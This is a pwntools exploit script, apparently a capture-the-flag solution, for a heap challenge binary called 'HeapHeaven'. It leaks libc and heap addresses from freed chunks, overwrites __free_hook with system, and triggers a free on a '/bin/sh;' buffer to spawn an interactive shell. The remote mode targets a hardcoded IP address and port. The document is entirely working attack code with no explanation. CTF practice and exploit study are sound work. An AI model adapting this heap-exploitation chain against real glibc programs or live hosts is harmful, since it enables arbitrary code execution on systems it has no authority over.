from pwn import *
import string
context.binary = './HeapHeaven'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


def dbg():
	raw_input()


if args['REMOTE']:
	p = remote('47.106.94.13', 50022)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./HeapHeaven')
	#gdb.attach(p)
	dbg()

def menu(ch):
	p.recvuntil('NOM-NOM\n')
	p.send(ch)

def num_to_str(num):
	out = ''
	while num:
		if num & 0x1:
			out += 'i'
			num -= 1
		else:
			out += 'a'
		num /= 2
	out = out[::-1]
	return 'w' + 'w'.join(list(out[:-1]+'t'))

def add(size):
	menu('whaa!')
	p.recvline()
	p.sendline(num_to_str(size))

def show(idx):
	menu('mommy?')
	sleep(0.5)
	p.sendline(num_to_str(idx))

def edit(idx, content):
	menu('<spill>')
	p.recvline()
	p.sendline(num_to_str(idx))
	p.recvline()
	p.sendline(content)

def delete(idx):
	menu('NOM-NOM')
	sleep(0.5)
	p.sendline(num_to_str(idx))


add(0x88)						#1
add(0x10)						#2
add(0x88)						#3
add(0x10)						#4

delete(0x20)								#free(1)
delete(0x20 + 0x90 + 0x20)					#free(2)

show(0x20)
p.recvuntil('darling: ')
libc_base = u64(p.recvline().strip('\x0a').ljust(8, '\x00')) - 0x3c4b78
show(0x20 + 0x90 + 0x20)
p.recvuntil('darling: ')

heap_base = u64(p.recvline().strip('\x0a').ljust(8, '\x00')) - 0x10
offset = libc_base + libc.symbols['__free_hook'] - heap_base

print "libc_base ==> " + hex(libc_base)
print "heap_base ==> " + hex(heap_base)
print "offset  ==> " + hex(offset)

edit(0x20, "/bin/sh;")
edit(offset, p64(libc_base + libc.symbols['system']))
delete(0x20)

print num_to_str(0x20)
p.interactive()
p.close()


